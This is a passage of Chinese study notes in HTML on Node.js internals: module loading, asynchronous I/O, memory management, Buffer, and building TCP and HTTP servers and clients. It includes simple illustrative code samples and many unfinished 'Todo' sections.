编译和执行时引入文件模块的最后一个阶段，定位到具体的文件后，Node会新建一个模块对象，然后根据路径载入并编译。对于不同的文件拓展名，器载入方法也有所不同</p> <ul><li>js文件，通过fs模块同步读取文件后编译执行</li> <li>.json文件，通过fs模块同步读取文件后，用JSON.parse()解析返回结果</li> <li>.node文件, 这是C/C++编写的拓展文件，通过dlopen()方法加载最后编译生成的文件</li> <li>其余拓展名文件，它们都被当做.js文件载入</li></ul> <h5 id="_1-js模块的编译"><a href="#_1-js模块的编译" class="header-anchor">#</a> 1.JS模块的编译</h5> <p>我们知道每个模块文件中存在着require,exports,module这三个变量，但是它们在模块文件中并没有定义，那么从何而来呢？甚至在Node的Api文档中，我们知道每个模块还有__filename, __dirname这两个变量的存在，它们又是从何而来的呢？如果我们把直接定义模块的过程放在浏览器端，会存在污染全局变量的情况</p> <p>事实上，在编译的过程中，Node对获取的js文件内容进行了头尾包装</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">exports<span class="token punctuation">,</span> require<span class="token punctuation">,</span> modlue<span class="token punctuation">,</span> __filename<span class="token punctuation">,</span> __dirname</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> math <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'math'</span><span class="token punctuation">)</span>
  exports<span class="token punctuation">.</span><span class="token function-variable function">area</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">radius</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token constant">PI</span> <span class="token operator">*</span> radius <span class="token operator">*</span> radius
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>这样每个模块文件之间都进行了作用域隔离
exports与modules.exports
// todo</p> <h5 id="_2-c-c-模块的编译"><a href="#_2-c-c-模块的编译" class="header-anchor">#</a> 2.C/C++模块的编译</h5> <h5 id="_3-json文件的编译"><a href="#_3-json文件的编译" class="header-anchor">#</a> 3.JSON文件的编译</h5> <p>Node利用fs模块异步读取json文件的内容之后，调用JSON.parse()方法得到对象。</p> <h3 id="_2-3-核心模块"><a href="#_2-3-核心模块" class="header-anchor">#</a> 2.3 核心模块</h3> <p>// Todo</p> <h3 id="_2-4-c-c-扩展模块"><a href="#_2-4-c-c-扩展模块" class="header-anchor">#</a> 2.4 C/C++扩展模块</h3> <p>// 自定义模块 Todo</p> <h3 id="_2-5-模块调用栈"><a href="#_2-5-模块调用栈" class="header-anchor">#</a> 2.5 模块调用栈</h3> <p>C/C++内建模块属于最底层的模块，它属于核心模块，主要提供API给JS核心模块和第三方JS文件模块调用。<br>
JS核心模块职责有两类：作为C/C++内建模块的封装层和桥接层，供文件模块(即用户自己编写的文件)调用；一类是纯粹的功能模块，它不需要和底层打交道，但是又十分重要。</p> <h3 id="_2-6-包与npm"><a href="#_2-6-包与npm" class="header-anchor">#</a> 2.6 包与NPM</h3> <p>// Todo~</p> <h3 id="_2-7-前后端共用模块"><a href="#_2-7-前后端共用模块" class="header-anchor">#</a> 2.7 前后端共用模块</h3> <p>// 前端模块化AMD,CMD</p> <h3 id="_2-8-总结"><a href="#_2-8-总结" class="header-anchor">#</a> 2.8 总结</h3> <p>Common.js实现了Node的模块化，<br>
在Node中核心模块，文件模块分别是如何被加载的？<br>
核心模块编译以及被引入的过程与原理<br>
NPM的使用，以及实现自己的NPM包<br>
前端模块化的实现</p> <h2 id="第三章-异步i-o"><a href="#第三章-异步i-o" class="header-anchor">#</a> 第三章 异步I/O</h2> <h3 id="_3-1-为什么要异步i-o"><a href="#_3-1-为什么要异步i-o" class="header-anchor">#</a> 3.1 为什么要异步I/O</h3> <p>异步获取资源，时间是获取时长最大者，同步获取资源，时间是获取资源时长之和</p> <p>多线程的优缺点，优点：多线程在多核CPU能有效提高CPU利用率，缺点：锁，切换上下文</p> <h3 id="_3-2-异步i-o现状"><a href="#_3-2-异步i-o现状" class="header-anchor">#</a> 3.2 异步I/O现状</h3> <p>操作系统的非阻塞I/O的实现：轮询</p> <h3 id="_3-3-node的异步i-o"><a href="#_3-3-node的异步i-o" class="header-anchor">#</a> 3.3 Node的异步I/O</h3> <p>事件循环：// Todo
异步I/O第一部分：组装好请求对象，送入I/O线程池等待执行。第二部分：回调通知</p> <h3 id="_3-4-非i-o的异步api"><a href="#_3-4-非i-o的异步api" class="header-anchor">#</a> 3.4 非I/O的异步API</h3> <p>定时器的执行时机<br>
process.nextTick()与setImmediate()执行先后</p> <h3 id="_3-5-事件驱动与高性能服务器"><a href="#_3-5-事件驱动与高性能服务器" class="header-anchor">#</a> 3.5 事件驱动与高性能服务器</h3> <p>异步I/O不仅仅应用在文件操作中<br>
几种服务器模型的优缺点</p> <h2 id="第四章-异步编程"><a href="#第四章-异步编程" class="header-anchor">#</a> 第四章 异步编程</h2> <h3 id="_4-1-函数式编程"><a href="#_4-1-函数式编程" class="header-anchor">#</a> 4.1 函数式编程</h3> <p>高阶函数：把函数作为参数，或是将函数作为返回值的函数，如forEach, map, reduce, reduceRight, filter, every, some</p> <p>偏函数：根据不同的参数可以产生不同的返回函数</p> <h3 id="_4-2-异步编程的优势与缺点"><a href="#_4-2-异步编程的优势与缺点" class="header-anchor">#</a> 4.2 异步编程的优势与缺点</h3> <p>Node的最大特性莫过于事件驱动的非阻塞I/O模型</p> <p>Node是为了解决编程模型中阻塞I/O的性能问题的</p> <h4 id="难点"><a href="#难点" class="header-anchor">#</a> 难点</h4> <ul><li>异常处理: try catch只能处理同步异常错误</li> <li>函数嵌套过深</li> <li>多线程编程</li></ul> <h3 id="_4-3-异步编程解决方案"><a href="#_4-3-异步编程解决方案" class="header-anchor">#</a> 4.3 异步编程解决方案</h3> <p>1.事件发布/订阅模式</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 订阅</span>
emmiter<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'event1'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// 发布</span>
emmiter<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'event1, '</span>i am message'<span class="token punctuation">)</span>
</code></pre></div><p>如果事件是侦听器过多，可能存在过多占用CPU的情况</p> <p>2.Promise
3.async</p> <h3 id="_4-4-异步并发控制"><a href="#_4-4-异步并发控制" class="header-anchor">#</a> 4.4 异步并发控制</h3> <h3 id="_4-5-总结"><a href="#_4-5-总结" class="header-anchor">#</a> 4.5 总结</h3> <p>本章主要介绍了异步编程的几种解决方案，如事件发布/订阅，Promsie等</p> <h2 id="第五章-内存控制"><a href="#第五章-内存控制" class="header-anchor">#</a> 第五章 内存控制</h2> <h3 id="_5-1-v8的垃圾回收机制和内存限制"><a href="#_5-1-v8的垃圾回收机制和内存限制" class="header-anchor">#</a> 5.1 V8的垃圾回收机制和内存限制</h3> <p>新生代内存与老生代内存</p> <h3 id="_5-2-高效使用内存"><a href="#_5-2-高效使用内存" class="header-anchor">#</a> 5.2 高效使用内存</h3> <h4 id="_5-2-1-作用域"><a href="#_5-2-1-作用域" class="header-anchor">#</a> 5.2.1 作用域</h4> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">foo</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> local <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>函数在被调用时会创建对应的作用域，函数执行完毕后，该作用域会被销毁。同时函数作用域内的局部变量分配在该作用域上，随作用域的销毁而销毁。只被局部变量引用的对象存活周期较短，在这个示例中，由于对象非常小，将会分配在新生代的From空间中，在作用域释放后，局部变量local失效，其引用的对象将会在下次垃圾回收时被释放。<br>
以上就是基本的内存回收过程</p> <h3 id="_5-2-2-闭包"><a href="#_5-2-2-闭包" class="header-anchor">#</a> 5.2.2 闭包</h3> <p>作用域链上的对象只能向上，这样外部无法向内部访问。如</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">foo</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> local <span class="token operator">=</span> <span class="token string">'局部变量'</span>
  <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>local<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> bar <span class="token operator">=</span> <span class="token function">funciton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> local <span class="token operator">=</span> <span class="token string">'局部变量'</span>
  <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>local<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p>在js中，实现外部作用域访问内部作用域中变量的方法叫做闭包(closure)，这得益于高阶函数这个特性：函数可以作为参数或者返回值，示例代码如下：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">foo</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> <span class="token function-variable function">bar</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> local <span class="token operator">=</span> <span class="token string">'局部变量'</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> local
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">var</span> baz <span class="token operator">=</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// bar函数引用了local变量，使得bar的作用于一直存在</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">baz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// local</span>
<span class="token punctuation">}</span>
</code></pre></div><p>// Todo</p> <h3 id="_5-3-内存指标"><a href="#_5-3-内存指标" class="header-anchor">#</a> 5.3 内存指标</h3> <p>查看进程的内存占用：process.memoryUsage()<br>
查看系统的内存占用：os.totalmem()以及freemem()<br>
Node的内存使用并非都是通过V8进行分配的，我们将那些不是通过V8分配的内存称为堆外内存。<br>
Buffer对象不同于其他对象，它不经过V8的内存分配机制，所以也不会有堆内存的大小限制。</p> <h3 id="_5-4-内存泄漏"><a href="#_5-4-内存泄漏" class="header-anchor">#</a> 5.4 内存泄漏</h3> <p>造成内存泄漏的原因如下：缓存，队列消费不及时，作用域未释放</p> <h4 id="_5-4-1-慎将内存当做缓存"><a href="#_5-4-1-慎将内存当做缓存" class="header-anchor">#</a> 5.4.1 慎将内存当做缓存</h4> <p>严格意义上缓存有着完善的过期策略，，而普通对象的键值对并没有<br>
一个可能造成内存泄漏的场景，memoize，undescore的实现：</p> <div class="language-js extra-class"><pre class="language-js"><code>_<span class="token punctuation">.</span><span class="token function-variable function">memorize</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">func<span class="token punctuation">,</span> hasher</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> memo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  hasher <span class="token operator">||</span> <span class="token punctuation">(</span>hasher <span class="token operator">=</span> _<span class="token punctuation">.</span>identity<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token function">hasher</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>arguments<span class="token punctuation">)</span>
    <span class="token keyword">return</span> _<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>memo<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token operator">?</span> memo<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">(</span>memo<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>arguments<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>这里潜藏的陷阱是每个被执行的结果都会按照参数缓存在memo对象上，不会被清除，这在前端网页这种短时应用场景中不存在大问题，但是执行量大和参数多样性的情况下，会造成内存占用不释放。<br>
所以在Node中，任何视图拿内存当缓存的行为都应当被限制。</p> <h3 id="_5-5-内存泄漏排查"><a href="#_5-5-内存泄漏排查" class="header-anchor">#</a> 5.5 内存泄漏排查</h3> <p>使用工具定位Node应用的内存泄漏</p> <h3 id="_5-6-大内存应用"><a href="#_5-6-大内存应用" class="header-anchor">#</a> 5.6 大内存应用</h3> <p>Node提供了stream模块用于处理大文件，stream分为可读，可写两种<br>
Node大多数模块都有stream的应用，比如fs的createReadStream()和createWriteStream()可以分别用于创建文件的可读流和可写流</p> <p><strong>buffer和stream的关系</strong><br>
buffer<br>
为数据缓冲对象，是一个类似数组结构的对象，可以通过指定开始写入的位置及写入的数据长度，往其中写入二进制数据
stream<br>
是对buffer对象的高级封装，其操作的底层还是buffer对象，stream可以设置为可读、可写，或者即可读也可写，在nodejs中继承了EventEmitter接口，可以监听读入、写入的过程。具体实现有文件流，httpresponse等</p> <h3 id="_5-7-总结"><a href="#_5-7-总结" class="header-anchor">#</a> 5.7 总结</h3> <p>Node将js的主要应用场景扩散到了服务器端，需要考虑的细节也与浏览器不同，需要更严谨地为每一份资源作出安排</p> <h2 id="第六章-理解buffer"><a href="#第六章-理解buffer" class="header-anchor">#</a> 第六章 理解Buffer</h2> <p>文件和网络I/O对于前端开发者而言都是不曾有的应用场景。<br>
由于应用场景不同，在Node中，应用需要处理网络协议，操作数据库，处理图片，接收上传文件等，在网络流和文件的操作中，还要处理大量二进制数据,js自带的字符串远远不能满足这些需求（JavaScript语言没有读取或操作二进制数据流的机制。），于是Buffer对象应运而生。</p> <h3 id="_6-1-buffer结构"><a href="#_6-1-buffer结构" class="header-anchor">#</a> 6.1 Buffer结构</h3> <p>Buffer是一个像Array的对象，元素为16进制的两位数，即0-255的数值</p> <p>由于buffer太过常见，Node在进程开启时就已经加载了它，并将其放在全局对象(global)上，所以在使用buffer时，无需通过require()即可直接使用</p> <h4 id="_6-1-3-beffer内存分配"><a href="#_6-1-3-beffer内存分配" class="header-anchor">#</a> 6.1.3 beffer内存分配</h4> <p>buffer对象内存匹配不是在V8的堆内存中，而是在Node的C++层面实现内存的申请的，Node在内存中使用的是C++层面申请内存，在js层面分配内存的策略</p> <p>Node以8KB为界限来区分Buffer是大对象还是小对象</p> <h3 id="_6-2-buffer的转换"><a href="#_6-2-buffer的转换" class="header-anchor">#</a> 6.2 Buffer的转换</h3> <p>字符串转buffer， <code>new Buffer(str, [encoding])</code> 第二个参数是编码模式，一般是UTF-8<br>
buffer转字符串，<code>buf.toString([encoding], [start], [end])</code></p> <h3 id="_6-3-buffer的拼接"><a href="#_6-3-buffer的拼接" class="header-anchor">#</a> 6.3 Buffer的拼接</h3> <h3 id="_6-4-buffer与性能"><a href="#_6-4-buffer与性能" class="header-anchor">#</a> 6.4 Buffer与性能</h3> <h3 id="_6-5-总结"><a href="#_6-5-总结" class="header-anchor">#</a> 6.5 总结</h3> <p>Buffer是二进制数据，字符串与Buffer之间存在编码关系</p> <h2 id="第七章-网络编程"><a href="#第七章-网络编程" class="header-anchor">#</a> 第七章 网络编程</h2> <h3 id="_7-1-构建tcp服务"><a href="#_7-1-构建tcp服务" class="header-anchor">#</a> 7.1 构建TCP服务</h3> <p>目前大多数应用都是基于TCP搭建而成的</p> <h4 id="_7-1-1-tcp"><a href="#_7-1-1-tcp" class="header-anchor">#</a> 7.1.1 TCP</h4> <p>TCP,Transmission Control Prototal,传输控制协议，在OSI模型中属于传输层协议。<br>
OSI模型由七层组成：物理层，数据链结层，网络层，传输层，会话层，表示层，应用层</p> <table><thead><tr><th>应用层</th> <th>表示层</th> <th>会话层</th> <th>传输层</th> <th>网络层</th> <th>链路层</th> <th>物理层</th></tr></thead> <tbody><tr><td>HTTP/SMTP/IMAP等</td> <td>加密/解密等</td> <td>通信连接/维持会话</td> <td>TCP/UDP</td> <td>IP</td> <td>网络特有的链路接口</td> <td>网络物理硬件</td></tr></tbody></table> <h4 id="_7-1-2-创建tcp服务器端"><a href="#_7-1-2-创建tcp服务器端" class="header-anchor">#</a> 7.1.2 创建TCP服务器端</h4> <p>服务器端即接收请求的一端</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> server <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    socket<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'你好'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'连接断开'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  socket<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'欢迎光临~'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server bound'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>出错，Unhandled 'error' event</p> <h4 id="_7-1-3-tcp服务的事件"><a href="#_7-1-3-tcp服务的事件" class="header-anchor">#</a> 7.1.3 TCP服务的事件</h4> <h5 id="_1-服务器事件"><a href="#_1-服务器事件" class="header-anchor">#</a> 1.服务器事件</h5> <p>通过net.createServer()创建的服务器而言，它是一个EventEmitter实例，有如下自定义事件</p> <p><strong>listening</strong>: 该事件在调用server.listen()绑定端口或者Domain Socket后出发，简洁写法为server.listen(port, listeningListener)，通过listen()方法的第二个参数传入。<br> <strong>connection</strong>:该事件在每个<strong>客户端</strong>连接到服务器端时触发，简洁写法为通过net.createServer()，最后一个参数传递<br> <strong>close</strong>: 该事件在服务器关闭时触发，在调用server.close()后，服务器将停止接收新的套接字连接，但保护当前存在的连接，等待所有连接都断开后，会触发该事件。<br> <strong>error</strong>: 该事件在服务器发生异常时，将会触发该事件，比如侦听一个使用中的端口，将会触发一个异常，如果不侦听error事件，服务器将会抛出异常。</p> <h5 id="_2-连接事件-本例可以理解为socket上的事件"><a href="#_2-连接事件-本例可以理解为socket上的事件" class="header-anchor">#</a> 2.连接事件(本例可以理解为socket上的事件)</h5> <p>服务器可以同时与多个客户端保持连接，对于每个连接而言是典型的可读可写<strong>Stream对象</strong>。<strong>Stream对象</strong>可以用于服务器端和客户端之间的通信，既可以通过data事件从一段读取另一端发来的数据，也可以通过write()方法从一端向另一端发送数据。它有如下自定义事件。</p> <p><strong>data</strong>: 当一端调用write()发送数据时，另一端会触发data事件，事件传递的数据即是write()发送的数据<br> <strong>end</strong>: 当连接中的任意一端发送了FIN数据时，将会触发该事件。<br> <strong>connect</strong>: 该事件用于客户端，当套接字与服务器连接成功时会被触发<br> <strong>drain</strong>: 当任意一端调用write()发送数据时，当前这端会触发该事件<br> <strong>error</strong>: 当异常发生时，会触发该事件。<br> <strong>close</strong>: 放套接字完全关闭时，触发该事件。<br> <strong>timeout</strong>：当一定事件后连接不再活跃时，该事件将会被触发，通知用户当前该连接已经被闲置了。</p> <p>另外，由于TCP套接字是可读可写的Stream对象，可以利用pipe()方法巧妙地实现管道操作，如下代码实现了一个echo服务器：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> server <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  socket<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'Echo server'</span><span class="token punctuation">)</span>
  socket<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">1337</span><span class="token punctuation">,</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="_7-2-构建udp服务"><a href="#_7-2-构建udp服务" class="header-anchor">#</a> 7.2 构建UDP服务</h3> <p>// Todo</p> <h3 id="_7-3-构建http服务"><a href="#_7-3-构建http服务" class="header-anchor">#</a> 7.3 构建HTTP服务</h3> <p>TCP和UDP都属于网络传输层协议，如果要构建高效地网络应用，就应该从传输层着手。但是对于经典的应用场景，则无需从传输层协议入手构造自己的应用，比如HTTP或SMTP等，这些经典的应用层协议对于普通应用而言绰绰有余。Node提供了基本的http和https模块用于HTTP和HTTPS的封装，对于其他应用层协议的封装，也能从社区中轻松找到其实现。<br>
实现一个HTTP服务器极其容易，代码如下：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>
http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'Hello World'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">1337</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server start'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h4 id="_7-3-1-http"><a href="#_7-3-1-http" class="header-anchor">#</a> 7.3.1 HTTP</h4> <p>HyperText Transfer Protocol，超文本传输协议,HTTP构建在TCP之上，属于应用层协议，在HTTP的两端是服务器和浏览器，即著名的B/S模式，如今精彩纷呈的Web即是HTTP的应用。(app也是HTTP应用)</p> <p>现在的应用，如浏览器，其实是一个<strong>HTTP的代理</strong>，用户的行为将会通过它转换为HTTP请求报文发送给服务器端，服务器端在处理请求后，发送响应报文给代理，代理在解析报文后，将用户需要的内容呈现在界面上。</p> <p>在linux命令行，可以使用 curl发送请求<br>
// HTTP报文，todo</p> <h4 id="_7-3-2-http模块"><a href="#_7-3-2-http模块" class="header-anchor">#</a> 7.3.2 http模块</h4> <p>在Node中,HTTP服务继承自TCP服务(net模块),它能够与多个客户端保持连接，由于其采用事件驱动的形式，并不为每一个连接创建额外的线程或进程，保持很低的内存占用，所以能实现高并发。HTTP服务于TCP服务模型由区别的地方在于，在开启keep-alive后，一个TCP会话可以用于多次请求和相应，TCP服务以connection为单位进行u、服务，HTTP服务以request为单位进行服务，http模块即使将connection到request的过程进行了封装。<br>
在请求产生的过程中，http模块那大连接中传来的数据，调用二进制模块http_parser进行解析，<strong>在解析完请求报文的报头后，触发request事件，调用用户的业务逻辑</strong></p> <p><strong>HTTP请求</strong><br>
req.method: 请求方法，值为GET，POST,DELETE,PUT.CONNECT等<br>
req.url：/等<br>
req.httpVersion: 1.1等<br>
其余报头会议上股个别规律的key:value格式，在解析后方盒子在req.headers属性上传递给业务逻辑以供调用</p> <p><strong>HTTP响应</strong><br>
响应头部信息的API：req.setHead,(这个貌似没找到用处?) req.setHeader</p> <p>如同TCP服务一样，http服务器也抽象了一些时间，以供应用层使用，服务器也是一个EventEmitter实例。<br>
connection事件：在开始http请求和响应前，客户端与服务器端需要建立底层的TCP连接，这个连接可能因为开启了keep-alive，可以在多次请求响应之间使用，当这个连接建立时，服务器触发一次connection事件。<br>
request事件：建立TCP连接后，http模块底层将在数据流中抽象出HTTP请求和HTTP响应，当强求数据发送到服务器端，在解析出HTTP请求头后，将会触发该事件，在res.end()后，TCP连接可能将用于下一次请求响应。<br>
close事件：与TCP服务器的行为一致。<br>
checkContinue事件： 。。。<br>
connect事件：<br>
upgrade事件：<br>
clientError事件</p> <h4 id="_7-3-3-http客户端"><a href="#_7-3-3-http客户端" class="header-anchor">#</a> 7.3.3 HTTP客户端</h4> <p>即用于<strong>发送请求</strong>的一段，node模块提供的api为: http.request(options,connect),用于构造http客户端，与curl命令大致相同</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>
  hostname<span class="token operator">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
  port<span class="token operator">:</span> <span class="token number">1334</span><span class="token punctuation">,</span>
  path<span class="token operator">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>
  method<span class="token operator">:</span> <span class="token string">'GET'</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> req <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'STATUS'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>statusCode<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'HEADERS'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

req<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
